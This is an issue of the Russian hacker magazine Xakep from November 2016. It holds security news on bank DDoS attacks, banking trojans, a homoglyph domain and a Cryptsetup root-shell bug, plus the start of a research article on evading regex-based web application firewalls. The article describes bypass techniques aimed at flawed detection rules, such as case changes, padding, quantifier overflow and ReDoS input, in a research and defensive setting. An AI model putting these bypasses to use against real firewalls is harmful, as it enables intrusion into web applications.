                                               НОЯБРЬ 2016


              №214





Вскрываем                                        Запускаем
обфусцированные                               небезопасный
приложения                                    софт в Android
для Android



Курс молодого                                       Изучаем
реверсера                                      возможности
малвари                                             нового WAF
                                            Shadow Daemon
    ПРИРУЧАЕМ





                                                         Cover  WAF’ЫStory

                 Изучаем методы поиска путей
                 обхода современных файрволов
                     для веб-приложений
                                            ноябрь 2016
          № 214





  MEGANEWS
Всё новое за последний месяц

  Приручаем WAF'ы
Изучаем методы поиска путей обхода современных файрволов для веб-приложений

  Зиг-хак
Эндрю «weev» Ауэрнхаймер о роли хакеров в политическом активизме

  Большая рыбалка
Шлем фишинговые письма своим сотрудникам

  Игра в облака
Рулим виртуальными серверами при помощи VMware Cloud

  Сила ракушки
Выбираем средство разработки и пишем скрипты на PowerShell

  RSS в холодном поту
Ставим и дорабатываем Coldsweat — сервер синхронизации RSS для своего хостинга

 WWW2
Интересные веб-сервисы

  Под флагом Веселого Роджера
Почему закрывают торрент-трекеры и что придет им на смену

  Карманный софт
Выпуск #25. Виджеты

  Мобильный дайджест октября
Google Pixel, Android 7.1 и универсальный root для всех смартфонов

   Allo, Google Assistant и Pixel
Колонка Евгения Зобнина

  Окна для робота
Запускаем настольные приложения Windows в Android

  «Введите пароль своего аккаунта»
Как взламывают защиту смартфонов от сброса к заводским настройкам

  Карантин для малвари
Запускаем небезопасный софт без угрозы утечки личных данных

  Обзор эксплоитов
Анализ новых уязвимостей

  Погружение в крипту
Часть 5: электронная подпись

  Бэкап или бэкдор?
История одного пентеста

  Ломаем софт для Android, часть 3
Обфускаторы, упаковщики и другие средства защиты кода

  X-TOOLS
Софт для взлома и анализа безопасности

  Reversing malware для начинающих
Часть 0: введение в ремесло

  Задачи на собеседованиях
Задачи от Stack Group и решение задач от Virtuozzo

  Что интересного произошло с нашими программерами за месяц
Колонка авторов

  Разработка на R: тайны циклов
Выжимаем максимум производительности при обработке больших объемов данных

  Реактивная разработка в Android
ReactiveX: фреймворк, который подружил ООП и функциональное программирование

  VK.com как бэкенд: подводные камни
Решаем проблемы по заявкам читателей

  Добро пожаловать в Матрицу
Изучаем Cappsule, систему изоляции приложений на базе технологий виртуализации

  Безболезненная инъекция
Патчим ядро Linux без перезагрузки

  Выбираем WMS-систему и ее техобеспечение
WMi, SCALE или WMOS? ЦОД или облако?

  Броня для сайтов
Изучаем возможности нового WAF Shadow Daemon

  Отказоустойчивые веб-серверы
Строим могучее решение на базе наследника OpenVZ

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал

                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





БАНКИ ПОД
УГРОЗОЙ
Прямые атаки на банки, финансовые организации и принадлежащие им ре-
сурсы и оборудование в последнее время становятся обычной практикой. Так,
в день президентских выборов в США многие пользователи могли заметить
перебои в работе ресурсов Сбербанка, «Альфа-банка», «ВТБ Банк Москвы»,
Московской биржи и «Росбанка». В «Лаборатории Касперского» случивше-
еся назвали «первой в этом году масштабной DDoS-волной, направленной
на российские банки». По данным экспертов компании, хакеры атаковали сай-
ты как минимум пяти известных финансовых организаций из первой десятки.

   «Атаки организованы с ботнетов, включающих десятки тысяч машин,
   территориально распределенных по нескольким десяткам стран. Систе-
  мы защиты банка отработали надежно, атака была оперативно обнару-
   жена и локализована подразделениями киберзащиты Сбербанка. Сбоев
   в работе сервиса для клиентов банка не было», — заявили представите-
   ли Сбербанка.

Ответственность за DDoS-атаки на российские финансовые учреждения взял
на себя хакер, известный под псевдонимом vimproduct. Злоумышленник зара-
батывает на жизнь, продавая DDoS в качестве услуги, так что устроить атаку
ему не составило большого труда. Журналистам vimproduct пояснил, что «Рос-
сия вызвала беспокойство некоторых моих клиентов, повлияв на президент-
ские выборы в США». Хакер не признался, кто именно заказал это нападение,
но сообщил, что атака обошлась заказчику весьма дорого. Если обычный день
услуг vimproduct стоит порядка 25–150 долларов, здесь «сумма, конечно, была
совсем другая».
   Исследователи компании «Доктор Веб» обнаружили источник атаки — это
ботнет, построенный на базе трояна BackDoor.IRC.Medusa.1. Он атаковал сай-
ты «Росбанка» и «Росэксимбанка». Специалисты полагают, что он же ответ-
ственен и за атаки на Сбербанк и другие финансовые учреждения.
   Как можно  догадаться  по  идентификатору,  присвоенному  малвари,
BackDoor.IRC.Medusa.1 — это IRC-бот, который получает команды при по-
мощи протокола обмена текстовыми сообщениями IRC (Internet Relay Chat).
Главное предназначение трояна — организация DDoS-атак. Хотя исследован-
ный образец малвари был обфусцирован с использованием пяти различных
средств, аналитики компании установили, что малварь способна выполнять
несколько типов DDoS-атак, а также может по команде злоумышленников за-
гружать и запускать на зараженной машине исполняемые файлы.
   Представители компании Group-IB предупреждают, что хакеры теперь
предпочитают обворовывать банки напрямую, компрометируя банкоматы.
Техника атаки, названная специалистами jackpotting (от слова джекпот), за по-
следнее время применялась на территории более чем десяти европейских
стран, включая банки Армении, Беларуси, Болгарии, Великобритании, Грузии,
Испании, Молдовы, Польши, России, Румынии и Эстонии.
   Начало этой серии атак было положено летом 2016 года на Тайване и в Та-
иланде: записи с камер наблюдения показали, что преступники просто подхо-
дили к банкоматам, делали что-то, после чего машины начинали резво выда-
вать деньги.
   Исследователи Group-IB считают, что за происходящим стоит российская
хакерская группа Cobalt, названная так из-за одного из инструментов, кото-
рым пользуются хакеры, — Cobalt Strike. Также аналитики полагают, что груп-
па Cobalt напрямую связана с другой известной группировкой, Buhtrap, из-за
сходства используемых хакерами инструментов.
   Впрочем, не снижается активность и обычных троянов-банкеров, нацелен-
ных на кражу реквизитов и паролей пользователей. Так, в начале месяца ис-
следователи «Лаборатории Касперского» описали в блоге компании интерес-
ный кейс: банкер, который распространялся через рекламные сообщения сети
Google AdSense и благодаря этому поражал даже тех пользователей, которые
посещали только привычные «надежные» сайты. География распространения
Trojan-Banker.AndroidOS.Svpeng ограничена только РФ и СНГ, а на пике его
«популярность» достигала 37 тысяч атакованных пользователей в день.
   География атак другого известного трояна, GM Bot, также известного под
названиями Acecard, SlemBunk и Bankosy, в этом году значительно расшири-
лась: по данным специалистов компании Avast, вторая версия банкера умеет
маскироваться под приложения более чем 50 различных банков и чаще всего
заражает пользователей из США, Канады, Австрии, Германии, Польши, Фран-
ции, Турции и Австралии. В большинстве случаев GM Bot выглядит как безо-
бидное приложение для Android или маскируется под плагины типа Flash.
  И наконец, специалисты компании Fortinet в ноябре обнаружили вирус
Banker.GT (для Android), который умеет препятствовать работе антивирусов.
Пока что малварь атакует исключительно пользователей пятнадцати банков
Германии, однако исследователи отмечают, что авторы трояна могут контро-
лировать и изменять список атакуемых мобильных приложений: Banker.GT
имеет собственные шаблоны для приложений каждого банка (чтобы пользо-
ватель точно ничего не заподозрил) и связывается с управляющим сервером
для получения разных пейлоадов для приложений разных банков.


СТАТИСТИКА УГРОЗ В ТРЕТЬЕМ КВАРТАЛЕ 2016 ГОДА

   «Лаборатория Касперского» представила сводный отчет об информационных угрозах
в третьем квартале 2016 года. Статистика показала, что число мобильных угроз за этот период
немного снизилось, тогда как шифровальщиков стало в 3,5 раза больше.
В третьем квартале был обнаружен 1 520 931 вредоносный установочный пакет для
мобильных — это в 2,3 раза меньше, чем во втором квартале
55,8% мобильных угроз — это RiskTool, легальные приложения, которые потенциально
опасны для пользователей, на втором месте различная AdWare (11,6%), а замыкают тройку
SMS-трояны (8,5%)
Мобильных банкеров стало в 1,1 раза больше: было найдено 30 167 различных троянов
Самый популярный банкер квартала — Trojan-Banker.AndroidOS.Svpeng.q,
распространявшийся через AdSence

Злоумышленники по-прежнему эксплуатируют уязвимости в различных популярных
приложениях, и лидерами в этой сфере выступают эксплоит-киты RIG и Magnitude

                Java, 5,6%                           Adobe Reader, 0,9%

  Adobe Flash Pleer, 13,5%

                                                     Браузеры, 44,8%

                Office, 15,9%


                                                            Android, 19,3%

В третьем квартале было обнаружено 21 новое семейство шифровальщиков и 32 091 новая
модификация существовавших ранее
Шифровальщики атаковали 821 865 пользователей KSN, что в 2,6 раза превышает
показатели второго квартала

Самыми распространенными криптовымогателями являются
CTB-Locker (атаковал 28,34% пользователей),
Locky (9,60%) и CryptXXX (8,95%)





КАРТИНКА
С СЮРПРИЗОМ
Растет и активность малвари на социальных сайтах, причем разработчики
зловредов становятся все более изобретательными. Специалисты обнару-
жили в ноябре новый вектор атак, получивший название ImageGate: с его по-
мощью малварь встраивается в изображения и графические файлы, кото-
рые далее распространяются в соцсетях. Первым масштабным применением
этой атаки стала спам-кампания в социальной сети Facebook, где с помощью
SVG-изображений злоумышленники заражали машины посетителей извест-
ным вирусом-вымогателем Locky.
   Специалисты Check Point вычислили метод, с помощью которого хакеры
запускают вредоносный код в социальных сетях, таких как Facebook и LinkedIn.
Внимательно посмотри видео процесса заражения и не кликай на файлы с не-
обычными расширениями (SVG, JS или HTA)! Эксперты пообещали опублико-
вать более подробное техническое описание нового вектора атаки, как только
уязвимость будет исправлена на большинстве подверженных ей сайтов.
   Впрочем, посещая YouTube, теперь тоже надо быть чрезвычайно бдитель-
ным: за последние два-три месяца злоумышленники практически превратили
этот популярный видеохостинг в площадку для рекламы и распространения
своих «инструментов». В какой-то момент сотрудники Google, очевидно, пере-
стали справляться с захлестнувшей сервис волной демо малвари, а механиз-
мов автоматической фильтрации подобных видео у YouTube еще нет.
   Специалисты пишут, что в изученных ими образчиках вредоносного ПО есть
скрытый код, который отправляет все перехваченные у жертв данные авторам
малвари. От такой «нечестной игры» разработчиков малвари страдают в итоге
не только сами скрипт-кидди, которые ищут малварь на YouTube, но и простые
пользователи, чьи учетные и платежные данные в итоге попадают в сети се-
рьезных преступников.

51,3%   впервые составила            сайтов1/3по-прежнему
    доля мобильного           использует сертификаты
        трафика                      SHA-1
                                               1 января 2017 года большинство      Аналитики компании StatCounter,
                                              удостоверяющих центров перейдут   сообщили, что в октябре 2016 года
                                                на использование сертификатов   ими впервые был зафиксирован мо-
                                               SHA-2, и производители браузеров   мент, когда мобильный трафик обо-
                                                 (включая Microsoft, Google и Mozilla)   гнал десктопный. Согласно телеметрии
                                              уже поддержали эту инициативу и   компании, доля мобильного трафика
                                                    готовятся окончательно отказаться   составила 51,3%, тогда как десктопы
                                                    от ненадежного алгоритма хеши-   породили лишь 48,7% трафика. Такой
                                               рования SHA-1 в начале года. При   прирост исследователи объясняют
                                              этом исследователи компании Venafi   просто: в бедных странах люди не
                                              сообщают, что сертификаты SHA-1   могут позволить себе прибрести ком-
                                              по-прежнему используют десятки   пьютер, поэтому пользуются мобиль-
                                              миллионов сайтов, а если точнее,   ными гаджетами. К примеру, в Индии
                                             примерно 34% от общего числа. Со-   мобильный трафик составляет 75%
                                             всем скоро браузеры начнут отобра-   от общего числа, тогда как в США,
                                                жать предупреждения об опасности   Великобритании и Австралии десктопы
                                                    таких ресурсов. Эксперты прогнози-   по-прежнему опережают мобильные
                                              руют проблемы с доступом, вплоть   устройства, генерируя 55–58%
                                              до полной недоступности некоторых   трафика.
                                                  ресурсов.





СОФТ МЕСЯЦА
В последнее время ИБ-эксперты со всего мира заговорили о безопасности
интернета вещей. О том, что IoT-устройства, как правило, защищены из рук
вон плохо, известно давно, однако череда недавних DDoS-атак заставила
обратить на эту проблему пристальное внимание. Ботнеты на основе Mirai,
GafGyt, LuaBot, Kaiten, BillGates, Rex или IRCTelnet сформировали самый на-
стоящий тренд. Проблему признают все, включая Марка Шаттлворта, основа-
теля Canonical (компании, которая стоит за Ubuntu):

  «Мы всегда смотрели на Windows как на уязвимую платформу, но теперь
   старые Linux-устройства оказались настоящей уязвимостью», — Марк
   Шаттлврот.

Новая версия Ubuntu Core 16 для IoT-устройств, официально выпущенная 3
ноября, предназначена для решения данной проблемы. Основным нововве-
дением разработчиков Canonical стала технология Snappy, которая способна
защитить IoT-устройства от хакеров и потери данных. Поработали в Canonical
и над обновлениями, так что замена прошивки и попытки «заткнуть дыры»
на IoT-устройствах больше не будут головной болью для их владельцев. Раз-
работчики Ubuntu уже сотрудничают с крупными вендорами (IBM, Dell), чтобы
дать производителям возможность доставлять обновления на свои устройства
автоматически.
  В Mozilla занимаются другой стороной пользовательской безопасности:
разработчики из этой компании выпустили анонсированный год назад аске-
тичный браузер Focus для iOS с включенным по умолчанию режимом инкогни-
то. В браузере нет ничего, кроме адресной строки: нет вкладок, списка люби-
мых сайтов, меню. Только адресная строка и одна-единственная кнопка Erase,
которая позволяет одним нажатием стереть всю историю, временные файлы
и куки. Впрочем, даже если ее не трогать, после закрытия браузера все дан-
ные в любом случае будут стерты.
   Focus по умолчанию применяет технологии, хорошо знакомые пользова-
телям Firefox: Private Browsing и Tracking Protection. Кроме того, в настройках
пользователь может заблокировать рекламные, аналитические и другие тре-
керы, которые применяются для отслеживания поведения, а также кастомные
шрифты и другие сторонние медиафайлы.
   Популярный кросс-платформенный FTP-клиент Filezilla тоже получил новое
усовершенствование — правда, не в базовой версии. Разработчик, известный
под псевдонимом fzss, представил собственный форк FTP-клиента — FileZilla
Secure, который наконец-то защищает учетные данные пользователя шифро-
ванием, а не хранит пароли в виде простого текста. Как нетрудно догадаться,
fzss пострадал из-за этой особенности FileZilla, после чего и решил самостоя-
тельно решить проблему.
    FileZilla Secure доступен на Mac, Linux и Windows (есть в том числе и пор-
тативная версия). Специально для параноиков fzss опубликовал и исходные
коды, их можно скачать с официального сайта и лично убедиться, что с прило-
жением все в порядке. Энтузиаст собирается поддерживать свою разработ-
ку и далее: среди ближайших планов — перевод FileZilla Secure на последнюю
версию клиента.
   Ну и для равновесия новость с другой стороны баррикад: на новозеланд-
ской конференции Kiwicon группа исследователей показала опенсорсный
фреймворк Little Doctor, созданный для компрометации приложений чатов,
работающих на базе JavaScript. Исследователи продемонстрировали работу
своего детища на примере приложений Rocket Chat и Ryver (видео).

    «Little Doctor написан в модульном стиле — чтобы создать червя практи-
   чески на любой платформе, вам понадобится только ваш собственный
   propagation-модуль. Этот кросс-платформенный червь позволяет по-
   хищать файлы любых приложений, которые сообщаются с WebRTC API
   и Cordova API», — говорят исследователи.

Код Little Doctor опубликован на GitHub, чтобы исследователи безопасности
могли взять его на вооружение.



                    «Теперь, спустя шесть месяцев, меня все
                еще спрашивают, считаю ли я по-преж-
                    нему, что Крейг Райт — это Сатоси Нака-
                    мото. Либо он был Сатоси, либо не был.
               В любом случае, нам стоит его игнориро-
                      вать. Я сожалею о том, что вообще ввя-
                   зался в игру „кем был Сатоси“, и собира-
                 юсь впредь тратить свое время на более
                  интересные и продуктивные вещи».

                                                                                   Гевин Андресен
                                       о Крейге Стивене Райте и попытках деанонимизировать создателя Bitcoin





                           Продолжение статьи
   Начало статьи





ГОЛОСА БУДУЩИХ
РОБОТОВ
На конференции Adobe Max Creativity состоялась презентация будущего ауди-
оредактора VoCo и его возможностей. Редактор показывает феноменальные
результаты: VoCo имитирует голос человека после всего двадцати минут обу-
чения на семплах. Разработчики сразу были вынуждены оговориться, что они,
разумеется, понимают, насколько опасна такая функциональность, и работа-
ют над этой проблемой.
   Это как раз тот случай, когда лучше один раз услышать, поэтому внимание
на видеоролик.
   Возможности нового редактора Adobe в первую очередь ориентированы
на создателей подкастов, представителей киноиндустрии и других сфер дея-
тельности, где возможность подправить аудиодорожку без фактической пере-
записи реплик ценится на вес золота. По сути, VoCo должен стать своего рода
«голосовым Photoshop».



                  «Компания Microsoft уже является важным
                   участником многих опенсорсных проектов
                  и на протяжении нескольких лет вовле-
                   чена в опенсорс-сообщество благодаря
                   партнерским отношениям и техническому
                     вкладу. Членство в Linux Foundation — это
                  важный шаг для Microsoft, но, пожалуй,
                     эта новость представляет даже больший
                   интерес для опенсорс-сообщества, кото-
                  рое только выиграет от постоянного уча-
                    стия компании».

                                                                 Глава Linux Foundation Джим Землин
                                                  о присоединении Microsoft к консорциуму Linux Foundation





MICROSOFT LINUX
16 ноября 2016 года можно назвать историческим днем: в этот день на кон-
ференции Microsoft Connect(); 2016 компания Microsoft официально объяви-
ла о своем присоединении к некоммерческому консорциуму Linux Foundation,
который курирует самые разные вопросы, связанные с развитием Linux, его
стандартизацией и защитой.
   Пятнадцать лет назад Стив Балмер, тогда руководивший компанией, на-
звал Linux и опенсорс-сообщество раковой опухолью. Но с тех пор многое
изменилось: нынешний глава Microsoft, Сатья Наделла, активно наводит мо-
сты с опенсорс-комьюнити. К примеру, компания опубликовала на GitHub ис-
ходные коды PowerShell, Visual Studio Code и JavaScript-движка Edge, откры-
ла платформу .NET Core 1.0 и стала, как это ни странно, одной из лидирующих
open source компаний. Microsoft активно сотрудничает с Red Hat и SUSE, а ле-
том 2016 года в Microsoft выпустили собственную сборку FreeBSD, добавив ее
в Azure Marketplace.
   Напомним, что Linux Foundation — далеко не первая организация, свя-
занная со свободным софтом, к которой присоединилась Microsoft. В марте
2016 года компания также вступила в Eclipse Foundation, а президентом фон-
да Apache Software Foundation на протяжении трех лет остается сотрудник
Microsoft Сэм Руби.

 2 000        59,19%000 000
 активных пользователей          cредняя доля спама
   насчитывает браузер           в мировом почтовом
        Chrome                      трафике
      Google обнародовала статистику,               Специалисты «Лаборатории Кас-
   согласно которой различными верси-             перского» опубликовали статистику о
   ями браузера Chrome пользуются уже           спаме и фишинге в третьем квартале
   более двух миллиардов человек (под-           2016 года. Пик активности спамеров
   счет производился по количеству уста-          пришелся на сентябрь, когда мусор-
   новок). При этом, по данным компа-            ные сообщения составили 61,25%
   нии, еще в апреле 2016 года у Chrome            от общего количества, и один только
   насчитывался один миллиард активных           ботнет Necurs в этом месяце генери-
   пользователей, то есть аудитория бра-           ровал порядка 6,5% от всего спама в
   узера за прошедшие полгода опреде-            мире. В среднем почтовый трафик в
   ленно увеличилась.                            третьем квартале был замусорен на
   Подтверждают статистику Google и              59,19%, что почти на 2 процентных
   данные компании NetMarketShare. По             пункта выше среднего показателя
   словам аналитиков, в 2016 году доля            предыдущего квартала. За эти ме-
   Chrome возросла с 35% до 55% рын-            сяцы ПО компании предотвратило
    ка. Основной прирост — это бывшие             более 37,5 миллиона попыток пере-
   пользователи Internet Explorer. За год            хода на фишинговые сайты. Главной
   браузер Microsoft потерял около 331            целью злоумышленников все еще
   миллиона пользователей и его доля на           остаются финансовые организации:
   рынке снизилась с 44% до 23%.                 на банки пришлось 27,13% атак.





ПОДМЕНА ДОМЕНА
Что ты можешь сказать про символ  ? Не правда ли, он похож на маленькую
прописную G?
  Именно так и думали получатели реферального спама, рассылаемого в на-
чале ноября жителям США с домена secret. oogle.com: сообщения выгляде-
ли достоверными, так как приходили от доверенного источника. Спамеры рас-
сылали сообщения Vote for Trump («Голосуйте за Трампа»), возможно оказав
в итоге некоторое влияние на результаты американских выборов.
   Исследователи из компании Analytics Edge, изучившие ситуацию, объясня-
ют, что к Google этот домен не имеет никакого отношения. Просто какой-то
предприимчивый спамер (по данным исследователей — из России) придумал
подменить букву G Unicode-символом 0262. Если поставить символы рядом
(  и G), разница очевидна, однако пользователи не замечают подмены, глядя
на ссылку вида  oogle.com.
  В последние годы в Сети происходит интернационализация доменных
имен, что позволяет пользователям регистрировать домены на родных языках,
так что использование подобных символов стало допустимым. Специалисты
предрекают новый виток фишинга и спама, с применением подмен.


ЧЕТВЕРТЬ САМЫХ УЯЗВИМЫХ ПРИЛОЖЕНИЙ —
ЭТО СРЕДСТВА ОБЕСПЕЧЕНИЯ БЕЗОПАСНОСТИ

   Исследователи компании Flexera Software (бывшая Secunia) составили рейтинг самых уяз-
вимых продуктов за август, сентябрь и октябрь 2016 года. Как ни странно, почти четверть ре-
шений в этом топе оказались различными продуктами для обеспечения безопасности, причем
созданы они такими известными производителями, как AlienVault, IBM, Juniper, McAfee, Palo
Alto и Splunk. Хотя проблемы в основном обнаруживали в сторонних опенсорсных библиотеках
и компонентах, факт остается фактом.

В топ-20 попали 46 решений разных
производителей, в них было найдено
2162 уязвимости
11 приложений из 46 (23,91%)
оказались продуктами для обеспечения
безопасности

Вендором, производящим самые
уязвимые продукты, по итогам трех
месяцев наблюдений была признана IBM

Продукт, в котором нашли больше всего
уязвимостей, — Avant Browser


Подробная статистика
за август
сентябрь
октябрь





ОБХОДИМ
БЛОКИРОВКУ IOS.
СНОВА
Около месяца назад, в октябре, представители Сбербанка предупреждали,
что голосовой помощник Siri может использоваться для хищения средств че-
рез функции SMS-банков. В корне проблемы лежит довольно старая тема:
обход экрана блокировки iOS при помощи Siri. Недаром исследователи реко-
мендуют отключать использование Siri — во избежание различных проблем.
   Свежий способ обхода экрана блокировки в очередной раз доказывает
правоту экспертов. Баг присутствует на iPhone и iPad, работающих под управ-
лением iOS 8 и новее. После эксплуатации бага, помимо доступа ко всем кон-
тактам и фото жертвы, атакующий также может выбрать любой контакт из спи-
ска и просмотреть все диалоги, которые владелец девайса ранее имел с этим
пользователем.
   На видео можно посмотреть демонстрацию атаки в исполнении самих ис-
следователей — блогеров EverythingApplePro и iDeviceHelps.



                   «Несколько сайтов ненадолго ушли в
                   офлайн. Никого не убили. Ничья соб-
                    ственность не была уничтожена. Но ком-
                  пьютеры проникли в наши жизни. В наши
                  дни интернет оказывает прямое, физи-
                   ческое влияние на реальный мир. Интер-
                    нет вещей принес компьютеризацию и
                  соединил десятки миллионов устройств
                  по всему миру. Мы соединяем автомо-
                    били, дроны, медицинские устройства
                  и домашние термостаты. Это становит-
                    ся опасным. Рынок не может справиться
                   с этим [самостоятельно]. Продавцам и
                   покупателям все равно. Правительство
                  должно вмешаться. Это сбой рынка, кото-
                 рый рынок не исправит сам».

                                                                       Брюс Шнайер
                                                   об атаке на DNS-провайдера Dyn, уязвимости интернета вещей
                                                                          и необходимости его регулирования





УГНАТЬ ЗА 70
СЕКУНД
В конце 2015 года испанский исследователь Гектор Марко нашел неприятный
баг: оказалось, что, если нажать клавишу Backspace 28 раз в тот момент, ког-
да GRUB спросит имя пользователя, появляется rescue shell. 2016 год Марко
завершает обнаружением еще одного похожего бага: исследователь выяснил,
что если при использовании Cryptsetup зажать клавишу Enter на 70 секунд,
то пользователь попадет в root shell initramfs.
   Хотя диски при этом все равно остаются зашифрованными, атакующий
сможет скопировать такой раздел (например, для последующего взлома) или
добраться до содержимого незашифрованных разделов.
   Когда Cryptsetup запрашивает у пользователя пароль для расшифровки
дисков, файл скрипта /scripts/local-top/cryptroot срабатывает некор-
ректно: через несколько попыток ввода пароля Cryptsetup решает, что работа-
ет на медленном устройстве, и позволяет пользователю продолжать подбор.
Когда пользователь превышает лимит попыток (примерно через 70 секунд
при постоянно нажатой клавише Enter), происходит «вылет» в root shell для от-
ладки «проблемы».
   Проблема CVE-2016-4484 актуальна для дистрибутивов на базе Debian
(к примеру, Ubuntu) и Fedora. Хотя разработчики Cryptsetup уже представили
исправление (версия 2:1.7.3-2), стабильная ветка пока исправления не полу-
чила.
COVERSTORY





                       Доклад
                        с Black Hat
                           2016





              КАК ИСКАТЬ БАЙПАСЫ
       В СОВРЕМЕННЫХ WEB APPLICATION
         FIREWALLS И ЧТО С НИМИ ДЕЛАТЬ





                                     Владимир Иванов,
                                                           Positive Technologies,
                                         OWASP
                                                   vivanov@ptsecurity.com

WAF — важная часть безопасности веб-приложения.
Фильтр, который в реальном времени блокирует вредо-
носные запросы еще до того, как они достигнут сайта, мо-
жет сослужить хорошую службу и отвести удар от прило-
жения. Тем не менее WAF’ы содержат множество ошибок.
Часть из них появляется по небрежности разработчиков,
часть — по незнанию. В этой статье мы изучим техники
поиска байпасов WAF на базе регулярок и токенизации,
а затем на практике рассмотрим, какие уязвимости суще-
ствуют в популярных файрволах.


                      WARNING

                                  Вся информация предоставлена исключи-
                                     тельно в ознакомительных целях. Ни ре-
                                      дакция, ни автор не несут ответственности
                                     за любой возможный вред, причиненный
                                  материалами данной статьи.

КАК РАБОТАЕТ WAF
Давайте рассмотрим механизмы работы WAF изнутри. Эта-
пы обработки входящего трафика в большинстве WAF оди-
наковы. Условно можно выделить пять этапов:

1. Парсинг HTTP-пакета, который пришел от клиента.
2. Выбор правил в зависимости от типа входящего пара-
   метра.                                                  INFO
3. Нормализация данных до вида, пригодного для анализа.
                                                                         На момент
4. Применение правила детектирования.                                                                               исследования
5. Вынесение решения о вредоносности пакета. На этом       абсолютно все
   этапе WAF либо обрывает соединение, либо пропускает      представленные
                                                                                  техники обхода   дальше — на уровень приложения.                                                                        были зиродеями.
                                                                            Сейчас часть из
Все этапы, кроме четвертого, хорошо изучены и в большин-       них уже активно
                                                                                 патчится вендорами,стве файрволов одинаковы. О четвертом пункте — прави-
                                                                            но тем не менее
лах детектирования — дальше и пойдет речь. Если проа-                                                                          подходы к поиску
нализировать виды логик обнаружения атак в пятнадцати     байпасов остаются
наиболее популярных WAF, то лидировать будут:                    неизменными.
•  регулярные выражения;
•  токенайзеры, лексические анализаторы;
•  репутация;
•  выявление аномалий;
•  score builder.

Большинство WAF используют именно механизмы регулярных выражений
(«регэкспы») для поиска атак. На это есть две причины. Во-первых, так исто-
рически сложилось, ведь именно регулярные выражения использовал первый
WAF, написанный в 1997 году. Вторая причина также вполне естественна —
это простота подхода, используемого регулярками.





                 Наиболее популярные техники детекта вредоносной нагрузки в WAF

Напомню, что регулярные выражения выполняют поиск подстроки (в нашем
случае — вредоносного паттерна) в тексте (в нашем случае — в HTTP-параме-
тре). Например, вот одна из самых простых регулярок из ModSecurity:


Это выражение ищет HTML-инъекцию типа XSS в теле запроса. Первая часть
((?i)) делает последующую часть выражения нечувствительной к регистру,
вторая (во вторых скобках) ищет открывающийся тег <script с произвольны-
ми параметрами внутри тега и произвольный текст после символа >.


Регулярные выражения очень популярны в security-продуктах. При работе
с веб-приложениями ты встретишь их на всех уровнях. Самый первый и бли-
жайший к пользователю — XSS Auditor, который встроен во все популярные
браузеры (даже в IE, начиная с версии 7). Второй — это фронтендовые ана-
лизаторы, предотвращающие исполнение вредоносного кода, который может
прийти с бэкенда в качестве данных. Третий уровень — бэкенд, на котором
также могут использоваться регулярки для постобработки данных — прове-
рять пользовательский ввод перед сохранением в БД, а также перед выводом
пользователю.



ИЗУЧАЕМ УЯЗВИМОСТИ ПРАВИЛ
Давай скачаем актуальные версии шести топовых бесплатных WAF и вытащим
из них все правила. В результате на диске у тебя скопится порядка 500 правил,
из которых около 90% защищают веб-приложение от XSS- и SQL-инъекций.





                              Собираем правила детекта из популярных файрволов


Предположим, что некоторые из исследуемых правил
имеют ошибки. Найденная ошибка в таком правиле по-
зволит использовать ее в качестве байпаса.
   Разделим типы байпасов, которые мы сможем эксплу-
атировать, на синтаксические (ошибка в использовании
синтаксиса регулярных выражений, из-за чего меняется        INFO
логика правила) и непредвиденные (правила изначально                                                                         Чтобы научиться
не учитывают определенные случаи). Теперь нужно по-                                                                              находить обходы,
добрать инструмент для анализа правил на предмет этих        необходимо
ошибок.                                                                     разобраться
                                                                                  в коварных
  Опытный специалист, пристально посмотрев на регу-                                                                               хитросплетениях
лярное выражение, сможет, исходя из своего опыта, дать         синтаксиса
вердикт, можно ли обойти данное правило. Однако точной         регулярных
                                                                             выражений.методологии, по которой неопытный хакер (или скрипт)
может проверить регулярное выражение на наличие обхо-
да, не существует. Давай ее создадим.

Модификаторы, числовые квантификаторы и позиционные
указатели
Возьмем для начала несложный пример. Здесь у нас простое выражение,
которое защищает функцию _exec(). Регулярка пытается найти паттерн
attackpayload в GET-параметре a и, если он найден, предотвратить испол-
нение вредоносного кода:




В этом коде есть как минимум три проблемы.
1. Регистр. Выражение не учитывает регистр, поэтому, если использовать на-
   грузку разного регистра, ее удастся обойти:


   Пофиксить это можно при помощи модификатора (?i), благодаря которо-
   му регистр не будет учитываться.
2. Символы начала и конца строки (^$). Выражение ищет вредоносную на-
   грузку, жестко привязываясь к позиции в строке. В большинстве языков, для
   которых предназначается вредоносная нагрузка (например, SQL), пробелы
   в начале и в конце строки не влияют на синтаксис. Таким образом, если до-
   бавить пробелы в начале и конце строки, защиту удастся обойти:


   Чтобы не допускать подобного байпаса, нужно обращать особое внимание
   на то, как используются явные указатели начала и конца строки. Зачастую
   они не нужны.
3. Квантификаторы ({1,3}). Регулярное выражение ищет количество вхожде-
   ний от одного до трех. Соответственно, написав полезную нагрузку четыре
   или более раз, можно ее обойти:


   Пофиксить это можно, указав неограниченное число вхождений подстроки
   (+ вместо {1,3}). Квантификатора {m,n} вообще следует избегать. Напри-
   мер, раньше считалось, что четыре символа — это максимум для корне-
   вого домена (к примеру, .info), а сейчас появились TLD типа .university. Как
   следствие, регулярные выражения, в которых используется паттерн {2,4},
   перестали быть валидными, и открылась возможность для байпаса.

Ошибки логики
Теперь давай рассмотрим несколько выражений посложнее.
1. (a+)+ — это пример так называемого ReDoS, отказа в обслуживании при
   парсинге текста уязвимым регулярным выражением. Проблема в том, что
   это регулярное выражение будет обрабатываться парсером слишком долго
   из-за чрезмерного количества вхождений в строку. То есть если мы пере-
   дадим aaaaaaa....aaaaaaaab, то в некоторых парсерах такой поиск будет
   выполнять 2^n операций сравнивания, что и приведет к отказу в обслужива-
   нии запущенной функции.
2. a'\s+b — в этом случае неверно выбран квантификатор. Знак + в регулярных
   выражениях означает «1 или более». Соответственно, мы можем передать
    «a' пробел-0-раз b», тем самым обойдя регулярку и выполнив вредоносную
   нагрузку.
3. a[\n]*b — здесь используется черный список. Всегда нужно помнить, что
   большинству Unicode-символов существуют эквивалентные альтернативы,
   которые могут быть не учтены в списке регулярки. Использовать блек-листы
   нужно с осторожностью. В данном случае обойти правило можно так: a\rb.

Особенности парсеров и опечатки
1. [A-z] — в этом примере разрешен слишком широкий скоуп. Кроме жела-
   емых диапазонов символов A-Z и a-z, такое выражение разрешает еще и
   ряд спецсимволов, в числе которых \, `, [, ] и так далее, что в большинстве
   случаев может привести к выходу за контекст.
2. [digit] — здесь отсутствует двоеточие до и после класса digit (POSIX
   character set). В данном случае это просто набор из четырех символов, все
   остальные разрешены.
